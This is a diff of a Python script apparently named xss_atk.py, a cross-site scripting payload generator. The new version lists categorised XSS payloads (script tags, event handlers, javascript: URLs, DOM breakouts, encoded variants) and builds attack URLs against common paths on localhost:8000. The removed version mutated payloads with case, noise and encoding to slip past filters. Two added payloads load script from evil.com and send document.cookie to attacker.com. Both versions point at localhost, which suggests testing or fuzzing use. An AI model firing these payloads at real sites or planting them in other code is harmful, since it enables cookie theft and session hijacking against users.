@@ -1,79 +1,55 @@
+"""
+tools/xss_atk.py — Cross-Site Scripting attack payload generator
+"""
+
 import random
-import urllib.parse
-import html
 
-TARGET = "http://localhost/test?input="
-
-BASE_PAYLOADS = [
+_SCRIPT_TAG = [
+    "<script>alert(document.cookie)</script>",
     "<script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "<svg onload=alert(1)>",
-    "<body onload=alert(1)>",
-    "<iframe src=javascript:alert(1)>",
-    "javascript:alert(1)",
-    "\"><script>alert(1)</script>",
-    "'><img src=x onerror=alert(1)>",
-    "<svg><script>alert(1)</script></svg>",
-    "data:text/html,<script>alert(1)</script>",
-    "<input autofocus onfocus=alert(1)>",
-    "<details open ontoggle=alert(1)>",
-    "<marquee onstart=alert(1)>",
-    "<math href=javascript:alert(1)>",
-    "<object data=javascript:alert(1)>",
+    "<SCRIPT>alert('XSS')</SCRIPT>",
+    "<script src=http://evil.com/xss.js></script>",
+    "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
 ]
 
-def random_case(s):
-    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
+_EVENT_HANDLERS = [
+    "<img src=x onerror=alert(1)>",
+    "<img src=x onerror=document.write('<script>alert(1)</script>')>",
+    "<svg onload=alert(1)>",
+    "<body onload=alert('XSS')>",
+    "<input onfocus=alert(1) autofocus>",
+    "<video onplay=alert(1) autoplay><source src=1></video>",
+]
 
-def insert_noise(s):
-    s = s.replace("=", random.choice(["=", " = ", "  ="]))
-    s = s.replace("alert", random.choice(["alert", "alert ", " alert"]))
-    return s
+_JAVASCRIPT_PROTO = [
+    "javascript:alert(1)",
+    "javascript:document.write('<img src=x onerror=alert(1)>')",
+    "<a href=javascript:alert(document.cookie)>Click</a>",
+]
 
-def html_entity_encode(s):
-    return html.escape(s)
+_DOM_BASED = [
+    "<iframe src=javascript:alert(1)>",
+    "<object data=javascript:alert(1)>",
+    "';alert(String.fromCharCode(88,83,83))//",
+    "</script><script>alert(1)</script>",
+    "\"><script>alert(document.domain)</script>",
+]
 
-def url_encode(s, rounds=1):
-    for _ in range(rounds):
-        s = urllib.parse.quote(s)
-    return s
+_ENCODED = [
+    "%3Cscript%3Ealert(1)%3C/script%3E",
+    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+    "<scri%00pt>alert(1)</scri%00pt>",
+]
 
-def double_wrap(s):
-    wrappers = [
-        lambda x: f"test{x}",
-        lambda x: f"{x}test",
-        lambda x: f"abc{x}123",
-    ]
-    return random.choice(wrappers)(s)
+ALL_PAYLOADS = _SCRIPT_TAG + _EVENT_HANDLERS + _JAVASCRIPT_PROTO + _DOM_BASED + _ENCODED
 
-def mutate(payload):
-    p = payload
+XSS_PATHS  = ["/search", "/comment", "/profile", "/feedback", "/message", "/post"]
+XSS_PARAMS = ["q", "query", "search", "comment", "name", "text", "message"]
 
-    if random.random() > 0.3:
-        p = random_case(p)
 
-    if random.random() > 0.5:
-        p = insert_noise(p)
-
-    if random.random() > 0.6:
-        p = html_entity_encode(p)
-
-    if random.random() > 0.4:
-        rounds = random.choice([1, 2])
-        p = url_encode(p, rounds)
-
-    if random.random() > 0.5:
-        p = double_wrap(p)
-
-    return p
-
-generated = set()
-
-while len(generated) < 100:
-    base = random.choice(BASE_PAYLOADS)
-    mutated = mutate(base)
-    curl_cmd = f'curl "{TARGET}{mutated}"'
-    generated.add(curl_cmd)
-
-for cmd in generated:
-    print(cmd)
+def generate() -> tuple[str, str]:
+    payload = random.choice(ALL_PAYLOADS)
+    path    = random.choice(XSS_PATHS)
+    param   = random.choice(XSS_PARAMS)
+    url     = f"http://localhost:8000{path}?{param}={payload}"
+    return url, payload
